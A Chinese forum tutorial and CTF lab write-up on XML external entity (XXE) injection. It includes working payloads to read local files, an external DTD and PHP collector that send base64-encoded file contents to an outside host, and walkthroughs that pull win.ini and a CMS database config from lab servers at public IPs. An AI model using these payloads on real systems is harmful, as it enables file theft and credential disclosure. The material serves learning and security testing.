> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1498101-1-1.html)

> [md]# 前言 > - 漏洞挖掘 XXE 实体注入，学习一下！** 做 XXE 题目之前我们先了解一下 XXE 实体注入的原理和利用方法 **# XXE 基础知识 > XML 用于标记电子文件使其具 ... 【CTF】漏洞挖......

 ![](https://avatar.52pojie.cn/data/avatar/001/63/96/37_avatar_middle.jpg) 孤樱懶契 _ 本帖最后由 孤樱懶契 于 2021-8-22 08:29 编辑_  

前言
==

> *   漏洞挖掘 XXE 实体注入，学习一下！

**做 XXE 题目之前我们先了解一下 XXE 实体注入的原理和利用方法**

XXE 基础知识
========

> XML 用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素

![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819141610681.png)

所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：元素、属性、实体、PCDATA、CDATA，由于网上太多介绍就不详细说了

DTD(文档类型定义)
-----------

DTD（document type defined）的作用是定义 XML 文档的合法构建模块。

DTD 可以在 XML 文档内声明，也可以外部引用。

而 DTD 的外部实体引用正是 XXE 漏洞诱因

首先写一个测试 xml 的文档的 php 代码

```
<?php
$test=$_POST['xml'];
$obj = simplexml_load_string($test,'SimpleXMLElement',LIBXML_NOENT);
print_r($obj);
highlight_file(__FILE__);
?>

```

#### **1、内部声明**

完整实例

```
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
<note>
  <to>George</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting!</body>
</note>

```

将我们刚刚的 php 代码利用 burp 抓包 post 传入内部声明形式输出看看，注意：要 url 编码一下，不然 & 无法被解析而报错

如下内部声明输出结果

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819142339515.png)

#### 2、外部声明

```
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note> 

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819142549954.png)

同样编码一下，正常输出

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819142611233.png)

由此，我们了解了基本的 DTD 内部和外部声明的使用

DTD 实体
------

> DTD 实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。

实体又分为一般实体和参数实体  
1，一般实体的声明语法:  
引用实体的方式：& 实体名；  
2，参数实体只能在 DTD 中使用，参数实体的声明格式：  
引用实体的方式：% 实体名；

#### 1、内部实体声明：

```
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer "Bill Gates">
<!ENTITY copyright "Copyright W3School.com.cn">
]>

<test>&writer;©right;</test>

```

post 传进去看看输出结果，同样正常输出

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819142830986.png)

#### 2、外部实体声明

```
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
]>
<author>&writer;©right;</author>

```

在了解了基础知识后，下面开始了解 xml 外部实体注入引发的问题。

XXE 的攻击方法
=========

方法一：直接通过 DTD 外部实体声明

```
<?xml version="1.0"?>
<!DOCTYPE xml [
<!ENTITY xxe SYSTEM "file:///C:/1.txt">
]>
<xxe>&xxe;</xxe>

```

**发包访问我 C 盘目录中 1.txt 文件**

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819143850362.png)

方法二：通过 DTD 文档引入外部 DTD 文档，再引入外部实体声明，由于普通的引入外部实体声明就不说了，直接说如果不回显怎么办

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819144644467.png)

当我们本地将 php 代码中的回显给关了，那我们怎么获取当前电脑的 c:/1.txt 文件呢？很简单，直接在公网域名上构造第一个 php 文件`x.php`

```
<?php
$content = $_GET['1'];
if(isset($content)){
    file_put_contents('flag.txt','更新时间:'.date("Y-m-d H:i:s")."\n".$content);
}else{
    echo 'no data input';
}

```

和第二个`xxe.xml`的外部实体文档

```
<!ENTITY % all
"<!ENTITY % send SYSTEM 'http://127.0.0.1/xml/x.php?1=%file;'"
>
%all;

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819145202712.png)

接着构造一个 payload

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/1.txt">
<!ENTITY % remote SYSTEM "http://127.0.0.1/xml/xxe.xml">
%remote;
%send;
]>

```

post 传参发包，发现生成了一个 flag.txt

![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819145349842.png)

接着我们就得到 1.txt 的 base64 的形式，解码一下, 就可以得到其中的内容

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819145619095.png)

支持的协议有哪些？

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819145646289.png)

具体的根据情况会产生的危害：

1、读取任意文件

2、执行系统命令（expect 需要扩展支持）

3、探测内网端口（利用 http 访问）

4、攻击内网网站等

XXE-1
=====

> 通过上面，我们已经充分了解了 XXE 的基础知识，直接进入实战环节
> 
> **实验环境：[http://59.63.200.79:8014/xxe/index.php](http://59.63.200.79:8014/xxe/index.php)**

打开靶场看到一个有 xxe 注入的点

```
 $postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);

```

而 $postStr 是由 post 传参的内容所控制，所以这里存在 XXE 漏洞

最底下爆出了绝对路径

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819150834903.png)

这题目标很明确了，由于攻击没有回显，在公网的某个服务器中放入我们刚刚的`x.php`和`xxe.xml`

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819150949128.png)

接着利用绝对路径可以读取 flag，payload

> 若是你没有公网 vps 服务器的话，这里有两个挂在公网上的可以试用
> 
> [http://59.63.200.79:8017/1.xml](http://59.63.200.79:8017/1.xml)
> 
> [http://59.63.200.79:8017/3.txt](http://59.63.200.79:8017/3.txt)
> 
> 访问上面那个一样可以

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/phpStudy/WWW/xxe/flag.php">
<!ENTITY % remote SYSTEM "http://59.63.200.79:8017/1.xml">
%remote;
%send;
]>

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819151333317.png)
> 
> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819151408189.png)

**base64 解码一下就是 flag 了**

XXE-2
=====

> **实验环境：[http://59.63.200.79:8207/](http://59.63.200.79:8207/)**

打开一看是个网站，看一下源码发现是闪灵 CMS 建站

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819151649693.png)

下载源码找关键函数 simplexml_load_string，这个容易出现 xxe

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819153630727.png)

分析

**1、`$postArr`是 php://input 直接接受 post 传参的。php://input 可以读取没有处理过的 POST 数据，相较于 $HTTP_RAW_POST_DATA 而言，它给内存带来的压力较小，并且不需要特殊的 php.ini 设置，php://input 不能用于 enctype=multipart/form-data。明显存在 XXE**

**2、想让 if 满足条件，`$signature`不为空，`$echostr`要为空，追踪发现 signature 和 echostr 都是 GET 传参**

**3、漏洞位置在 weixin/index.php, 可以通过源码知道存在 / conn/conn.php 的文件，里面包含着数据库文件**

知道了地点了，测试了下是 windows 系统，访问一下`c:/windows/win.ini`

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini">
<!ENTITY % remote SYSTEM "http://59.63.200.79:8017/1.xml">
%remote;
%send;
]>

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819154854594.png)

可以直接利用爆出的路径读取 conn/conn.php

payload 如下

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/phpStudy/scms/conn/conn.php">
<!ENTITY % remote SYSTEM "http://59.63.200.79:8017/1.xml">
%remote;
%send;
]>

```

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819154957834.png)

你们访问 http://59.63.200.79:8017/3.txt 应该就可以看到

接着解码看看，数据库的全部数据都出来了，可以直接

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819155118177.png)

**根据源码可以找到 adminer.php 是连接数据库的后台 http://59.63.200.79:8207/adminer.php**

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819155359567.png)
> 
> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819155533478.png)
> 
> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819160022233.png)

但是很奇怪的是，这个数据库居然在 linux 系统里面，所以登陆不了管理员后台

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210819160236364.png)

日志和 UDF 都撸不了，没权限开读文件功能。

我的个人博客
======

> 孤桜懶契：[http://gylq.gitee.io](http://gylq.gitee.io)
> -------------------------------------------------